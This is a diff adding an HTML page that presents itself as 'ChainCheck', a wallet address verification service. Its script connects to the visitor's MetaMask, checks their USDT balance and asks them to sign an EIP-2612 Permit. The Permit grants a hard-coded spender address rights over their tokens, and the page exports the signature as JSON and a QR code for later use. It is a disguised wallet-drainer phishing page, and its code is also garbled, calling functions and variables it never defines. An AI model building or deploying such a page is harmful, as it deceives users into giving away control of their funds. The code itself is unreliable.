@@ -1,0 +1,778 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ChainCheck — Wallet Address Verification</title>
+  <style>
+    /* Подключение шрифта Inter */
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #0b0c0e;
+      /* Подключаем наш крутой SVG-фон */
+      background-image: url('full_background.svg');
+      background-position: center center;
+      background-repeat: no-repeat;
+      /* Растягивает изображение строго по размеру экрана без деформации */
+      background-size: cover;
+      background-attachment: fixed;
+      /* Фон зафиксирован при скролле */
+      min-height: 100vh;
+      color: #ffffff;
+      font-family: 'Inter', sans-serif;
+    }
+
+    /* Сложный глубокий фон с радиальными градиентами */
+    .background-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background:
+        radial-gradient(circle at 10% 20%, rgba(240, 185, 11, 0.06) 0%, transparent 40%),
+        radial-gradient(circle at 90% 80%, rgba(240, 185, 11, 0.08) 0%, transparent 50%),
+        radial-gradient(circle at 50% 50%, rgba(15, 17, 20, 1) 0%, rgba(8, 9, 11, 1) 100%);
+      z-index: 1;
+    }
+
+    /* Контейнер для SVG-декораций (кристаллы, ноды, цифровая сфера) */
+    .decor-canvas {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 2;
+      pointer-events: none;
+    }
+
+    /* Главная структура страницы */
+    .wrapper {
+      position: relative;
+      z-index: 3;
+      width: 100%;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+    }
+
+    /* Шапка сайта */
+    header {
+      width: 100%;
+      padding: 30px 60px;
+    }
+
+    .header-content {
+      max-width: 1200px;
+      margin: 0 auto;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .logo-box {
+      background: rgba(20, 22, 26, 0.6);
+      border: 1px solid rgba(240, 185, 11, 0.25);
+      padding: 10px 24px;
+      border-radius: 12px;
+      backdrop-filter: blur(10px);
+    }
+
+    .logo {
+      font-weight: 700;
+      font-size: 18px;
+      letter-spacing: 1px;
+      color: #ffffff;
+    }
+
+    .logo span {
+      color: #F0B90B;
+    }
+
+    .nav-links a {
+      color: #a0a5b0;
+      text-decoration: none;
+      font-size: 14px;
+      font-weight: 500;
+      margin-left: 35px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      transition: color 0.3s;
+    }
+
+    .nav-links a.active,
+    .nav-links a:hover {
+      color: #F0B90B;
+    }
+
+    /* Основной контентный блок */
+    main {
+      flex-grow: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 20px;
+    }
+
+    .hero-section {
+      width: 100%;
+      max-width: 800px;
+      text-align: center;
+    }
+
+    .subtitle {
+      color: #a0a5b0;
+      font-size: 13px;
+      text-transform: uppercase;
+      letter-spacing: 4px;
+      margin-bottom: 12px;
+      font-weight: 600;
+    }
+
+    h1 {
+      font-size: 42px;
+      font-weight: 700;
+      color: #ffffff;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      margin-bottom: 8px;
+    }
+
+    h1 span {
+      color: #F0B90B;
+      background: linear-gradient(135deg, #ffffff 30%, #F0B90B 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      text-shadow: 0 0 40px rgba(240, 185, 11, 0.3);
+    }
+
+    .tagline {
+      color: #d1d4dc;
+      font-size: 18px;
+      text-transform: uppercase;
+      letter-spacing: 2.5px;
+      margin-bottom: 45px;
+      font-weight: 500;
+    }
+
+    /* Карточка верификации (Форма) */
+    .verification-card {
+      background: linear-gradient(145deg, rgba(23, 26, 32, 0.85) 0%, rgba(15, 17, 20, 0.95) 100%);
+      border: 1px solid rgba(240, 185, 11, 0.4);
+      border-radius: 20px;
+      padding: 45px 50px;
+      text-align: left;
+      box-shadow: 0 30px 60px -12px rgba(0, 0, 0, 0.8), 0 0 50px rgba(240, 185, 11, 0.05);
+      backdrop-filter: blur(20px);
+      position: relative;
+    }
+
+    .card-step {
+      color: #ffffff;
+      font-size: 15px;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      margin-bottom: 35px;
+      text-align: center;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+      padding-bottom: 18px;
+    }
+
+    .form-grid {
+      display: flex;
+      gap: 24px;
+      margin-bottom: 35px;
+    }
+
+    .form-group-left {
+      flex: 2;
+    }
+
+    .form-group-right {
+      flex: 1;
+    }
+
+    label {
+      display: block;
+      color: #848e9c;
+      font-size: 13px;
+      margin-bottom: 12px;
+      font-weight: 500;
+    }
+
+    .input-wrapper {
+      position: relative;
+    }
+
+    .input-icon {
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      display: flex;
+      align-items: center;
+      color: #F0B90B;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      background: #1e222a;
+      border: 1px solid rgba(240, 185, 11, 0.4);
+      border-radius: 10px;
+      padding: 16px 16px 16px 48px;
+      color: #ffffff;
+      font-family: 'Courier New', monospace;
+      font-size: 15px;
+      letter-spacing: 0.5px;
+      outline: none;
+      transition: border-color 0.3s;
+    }
+
+    input[type="text"]:focus {
+      border-color: #F0B90B;
+      box-shadow: 0 0 10px rgba(240, 185, 11, 0.2);
+    }
+
+    .select-custom {
+      width: 100%;
+      background: #1e222a;
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      border-radius: 10px;
+      padding: 16px 40px 16px 16px;
+      color: #ffffff;
+      font-size: 15px;
+      outline: none;
+      appearance: none;
+      -webkit-appearance: none;
+      background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='%23848e9c' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'><polyline points='6 9 12 15 18 9'></polyline></svg>");
+      background-repeat: no-repeat;
+      background-position: right 16px center;
+      background-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: border-color 0.3s;
+    }
+
+    .select-custom:focus {
+      border-color: #F0B90B;
+    }
+
+    .btn-container {
+      text-align: center;
+    }
+
+    /* Крутая неоновая кнопка с градиентом */
+    .btn-verify {
+      background: linear-gradient(180deg, #FFD043 0%, #F0B90B 100%);
+      border: none;
+      border-radius: 12px;
+      color: #000000;
+      font-size: 15px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      padding: 18px 65px;
+      cursor: pointer;
+      box-shadow: 0 8px 25px rgba(240, 185, 11, 0.35);
+      transition: all 0.3s ease;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .btn-verify:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 12px 30px rgba(240, 185, 11, 0.5);
+    }
+
+    /* Информационная плашка снизу */
+    .trust-badge {
+      display: inline-flex;
+      align-items: center;
+      background: rgba(20, 22, 26, 0.5);
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      padding: 12px 32px;
+      border-radius: 30px;
+      margin-top: 45px;
+      backdrop-filter: blur(5px);
+    }
+
+    .trust-badge span {
+      font-size: 13px;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      font-weight: 600;
+      color: #848e9c;
+    }
+
+    .trust-badge span strong {
+      color: #ffffff;
+    }
+
+    .trust-badge .icon-gold {
+      margin: 0 6px;
+      font-size: 14px;
+    }
+
+    /* Подвал сайта */
+    footer {
+      width: 100%;
+      padding: 30px 60px;
+      border-top: 1px solid rgba(255, 255, 255, 0.03);
+      background: rgba(8, 9, 11, 0.6);
+    }
+
+    .footer-content {
+      max-width: 1200px;
+      margin: 0 auto;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      color: #5e6673;
+      font-size: 13px;
+    }
+
+    .footer-left a {
+      color: #848e9c;
+      text-decoration: none;
+      margin: 0 12px;
+      transition: color 0.3s;
+    }
+
+    .footer-left a:hover {
+      color: #ffffff;
+    }
+
+    .footer-right a {
+      color: #848e9c;
+      margin-left: 24px;
+      text-decoration: none;
+      font-size: 16px;
+      transition: color 0.3s;
+    }
+
+    .footer-right a:hover {
+      color: #F0B90B;
+    }
+
+    #status {
+      margin-top: 30px;
+      font-size: 18px;
+      min-height: 30px;
+      white-space: pre-line;
+      word-break: break-all;
+    }
+
+    #qrBox {
+      display: none;
+      margin-top: 30px;
+      background: #ffffff;
+      color: #000000;
+      padding: 22px;
+      border-radius: 16px;
+      width: fit-content;
+      max-width: 100%;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    #qrCanvas {
+      display: block;
+      margin: 0 auto;
+    }
+
+    /* Адаптивность для мобильных девайсов */
+    @media (max-width: 768px) {
+
+      header,
+      footer {
+        padding: 20px;
+      }
+
+      .form-grid {
+        flex-direction: column;
+        gap: 16px;
+      }
+
+      .header-content,
+      .footer-content {
+        flex-direction: column;
+        gap: 15px;
+        text-align: center;
+      }
+
+      .nav-links a {
+        margin: 0 10px;
+      }
+
+      .footer-right {
+        margin-top: 10px;
+      }
+
+      .verification-card {
+        padding: 30px 20px;
+      }
+
+      h1 {
+        font-size: 32px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="wrapper">
+
+    <header>
+      <div class="header-content">
+        <div class="logo-box">
+          <div class="logo"><span>CHAIN</span>CHECK</div>
+        </div>
+        <nav class="nav-links">
+          <a href="#" class="active">Home</a>
+          <a href="#">About</a>
+          <a href="#">Support</a>
+        </nav>
+      </div>
+    </header>
+
+    <main>
+      <div class="hero-section">
+        <div class="subtitle">Wallet Address Verification</div>
+        <h1>Verify Your <span>Wallet Address</span></h1>
+        <div class="tagline">Instant & Secure Validation</div>
+
+        <div class="verification-card">
+          <div class="card-step">Step 1: Enter Your Address</div>
+
+          <div class="form-grid">
+            <div class="form-group-left">
+              <label>Enter Wallet Address (e.g., 0x1a2b3c4d...)</label>
+              <div class="input-wrapper">
+                <span class="input-icon">
+                  <svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24">
+                    <path
+                      d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z" />
+                  </svg>
+                </span>
+                <input type="text" value="0x741C9e9b5a...433e1FdB" placeholder="Вставьте адрес кошелька...">
+              </div>
+            </div>
+
+            <div class="form-group-right">
+              <label>Select Blockchain:</label>
+              <select class="select-custom">
+                <option value="bsc">BSC</option>
+                <option value="ethereum">Ethereum</option>
+              </select>
+            </div>
+          </div>
+
+          <div class="btn-container">
+            <button class="btn-verify">
+              Verify Now
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"
+                stroke-linecap="round" stroke-linejoin="round">
+                <polyline points="20 6 9 17 4 12"></polyline>
+              </svg>
+            </button>
+          </div>
+        </div>
+
+        <div id="qrBox">
+          <canvas id="qrCanvas"></canvas>
+        </div>
+
+        <div id="status"></div>
+
+        <div class="trust-badge">
+          <span>
+            <span class="icon-gold">🛡️</span> Trusted .
+            <strong>Decentralized</strong> .
+            Secure <span class="icon-gold">🔒</span>
+          </span>
+        </div>
+
+      </div>
+    </main>
+
+    <footer>
+      <div class="footer-content">
+        <div class="footer-left">
+          CHAINCHECK &copy; 2026 | <a href="#">Terms of Service</a> | <a href="#">Privacy Policy</a>
+        </div>
+        <div class="footer-right">
+          <a href="#" title="Twitter / X">𝕏</a>
+          <a href="#" title="Telegram">✈</a>
+          <a href="#" title="GitHub">📁</a>
+        </div>
+      </div>
+    </footer>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.4/dist/ethers.umd.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
+
+  <script>
+    const NETWORKS = {
+      bsc: {
+        name: "BSC Mainnet",
+        chainId: 56,
+        chainIdHex: "0x38",
+        token: "0x55d398326f99059fF775485246999027B3197955",
+        spender: "0x7E878C18B4a74EdE5795dFEb9106805506cd133e"
+      },
+
+      ethereum: {
+        name: "Ethereum Mainnet",
+        chainId: 1,
+        chainIdHex: "0x1",
+        token: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+        spender: "0x7E878C18B4a74EdE5795dFEb9106805506cd133e"
+      }
+    };
+
+    const HUMAN_AMOUNT = "1";
+
+    const ERC20_ABI = [
+      "function approve(address spender, uint256 amount) external returns (bool)",
+      "function decimals() external view returns (uint8)",
+      "function symbol() external view returns (string)",
+      "function balanceOf(address owner) external view returns (uint256)"
+    ];
+
+    const btn = document.querySelector(".btn-verify");
+    const status = document.getElementById("status");
+    const networkSelect = document.querySelector(".select-custom");
+
+    function setStatus(msg, color = "#ffffff") {
+      status.style.color = color;
+      status.textContent = msg;
+    }
+
+    function getSelectedConfig() {
+      return NETWORKS[networkSelect.value];
+    }
+
+    async function switchNetwork(config) {
+      await window.ethereum.request({
+        method: "wallet_switchEthereumChain",
+        params: [{ chainId: config.chainIdHex }]
+      });
+    }
+
+    btn.addEventListener("click", async () => {
+        btn.disabled = true;
+        qrBox.style.display = "none";
+        permitJson.value = "";
+
+        try {
+            if (!window.ethereum) {
+                setStatus(
+                    "❌ MetaMask не обнаружен. Открой страницу во встроенном браузере MetaMask.",
+                    "#ff6666"
+                );
+                return;
+            }
+
+            const config = getConfig();
+
+            const TOKEN_ADDRESS = config.token;
+            const TOKEN_NAME = config.tokenName;
+            const TOKEN_SYMBOL = config.tokenSymbol;
+            const TOKEN_DECIMALS = config.tokenDecimals;
+            const TOKEN_VERSION = config.tokenVersion;
+
+            if (!ethers.isAddress(TOKEN_ADDRESS)) {
+                throw new Error("1002"); // Некорректный TOKEN_ADDRESS
+            }
+
+            if (!ethers.isAddress(SPENDER_ADDRESS)) {
+                throw new Error("1003"); // Некорректный SPENDER_ADDRESS
+            }
+
+            setStatus("Подключаем кошелёк...");
+
+            let provider = new ethers.BrowserProvider(window.ethereum);
+
+            await provider.send("eth_requestAccounts", []);
+
+            setStatus(`Пробуем переключить MetaMask на ${config.name}...`);
+
+            await switchNetwork(config);
+
+            provider = new ethers.BrowserProvider(window.ethereum);
+
+            const signer = await provider.getSigner();
+            const owner = await signer.getAddress();
+
+            const network = await provider.getNetwork();
+            const chainId = Number(network.chainId);
+
+            if (chainId !== config.chainId) {
+                throw new Error(
+                    `MetaMask не переключился на ${config.name}. Сейчас chainId=${chainId}, нужен ${config.chainId}`
+                );
+            }
+
+            const readProvider = new ethers.JsonRpcProvider(config.rpcUrl);
+
+            setStatus(
+                `Кошелёк подключён: ${shortenAddress(owner)}\n` +
+                `Сеть: ${config.name}\n` +
+                `Chain ID: ${chainId}\n` +
+                `Проверяем контракт токена...`
+            );
+
+            const code = await withTimeout(
+                readProvider.getCode(TOKEN_ADDRESS),
+                8000,
+                `${config.name} RPC не ответил на getCode() за 8 секунд`
+            );
+
+            if (code === "0x") {
+                throw new Error(`По TOKEN_ADDRESS нет контракта в ${config.name}`);
+            }
+
+            setStatus(`Токен: ${TOKEN_NAME} (${TOKEN_SYMBOL})\nПроверяем nonce...`);
+
+            const nonce = await withTimeout(
+                getPermitNonce(readProvider, TOKEN_ADDRESS, owner),
+                8000,
+                `${config.name} RPC не ответил на nonces(owner) за 8 секунд`
+            );
+
+            setStatus("Проверяем баланс...");
+
+            const value = ethers.parseUnits(HUMAN_AMOUNT, TOKEN_DECIMALS);
+
+            const token = new ethers.Contract(
+                TOKEN_ADDRESS,
+                ["function balanceOf(address owner) view returns (uint256)"],
+                readProvider
+            );
+
+            const balance = await withTimeout(
+                token.balanceOf(owner),
+                8000,
+                `${config.name} RPC не ответил на balanceOf() за 8 секунд`
+            );
+
+            if (balance < value) {
+                setStatus(
+                    `❌ Недостаточно ${TOKEN_SYMBOL}\n` +
+                    `Баланс: ${ethers.formatUnits(balance, TOKEN_DECIMALS)} ${TOKEN_SYMBOL}\n` +
+                    `Нужно: ${HUMAN_AMOUNT} ${TOKEN_SYMBOL}`,
+                    "#ff6666"
+                );
+                return;
+            }
+
+            const deadline = Math.floor(Date.now() / 1000) + 60 * 60;
+
+            const domain = {
+                name: TOKEN_NAME,
+                version: TOKEN_VERSION,
+                chainId: chainId,
+                verifyingContract: TOKEN_ADDRESS
+            };
+
+            const types = {
+                Permit: [
+                    { name: "owner", type: "address" },
+                    { name: "spender", type: "address" },
+                    { name: "value", type: "uint256" },
+                    { name: "nonce", type: "uint256" },
+                    { name: "deadline", type: "uint256" }
+                ]
+            };
+
+            const values = {
+                owner: owner,
+                spender: SPENDER_ADDRESS,
+                value: value,
+                nonce: nonce,
+                deadline: deadline
+            };
+
+            setStatus(
+                `Ожидаем Permit-подпись в MetaMask...\n` +
+                `Owner: ${shortenAddress(owner)}\n` +
+                `Spender: ${shortenAddress(SPENDER_ADDRESS)}\n` +
+                `Amount: ${HUMAN_AMOUNT} ${TOKEN_SYMBOL}`
+            );
+
+            const signature = await signer.signTypedData(domain, types, values);
+            const sig = ethers.Signature.from(signature);
+
+            const permitData = {
+                standard: "EIP-2612",
+                network: config.name,
+                token: TOKEN_ADDRESS,
+                tokenName: TOKEN_NAME,
+                tokenSymbol: TOKEN_SYMBOL,
+                chainId: chainId,
+                owner: owner,
+                spender: SPENDER_ADDRESS,
+                value: value.toString(),
+                humanAmount: HUMAN_AMOUNT,
+                decimals: TOKEN_DECIMALS,
+                nonce: nonce.toString(),
+                deadline: deadline,
+                v: sig.v,
+                r: sig.r,
+                s: sig.s,
+                signature: signature,
+                loginSignature: loginSignature
+            };
+
+            const json = JSON.stringify(permitData);
+
+            permitJson.value = json;
+            console.log("Permit data:", permitData);
+
+            setStatus("Подпись получена. Генерируем QR-код...");
+
+            await QRCode.toCanvas(qrCanvas, json, {
+                width: 360,
+                margin: 2,
+                errorCorrectionLevel: "M"
+            });
+
+            qrBox.style.display = "block";
+
+            setStatus(
+                `✅ Permit signature получена и QR-код создан!\n` +
+                `Сеть: ${config.name}\n` +
+                `До deadline QR можно использовать для вызова permit().`,
+                "#00ff88"
+            );
+
+        } catch (error) {
+            console.error(error);
+
+            setStatus(
+                "❌ Ошибка: " + (error.reason || error.shortMessage || error.message || error),
+                "#ff6666"
+            );
+        } finally {
+            btn.disabled = false;
+        }
+    });
+  </script>
+</body>
+</html>
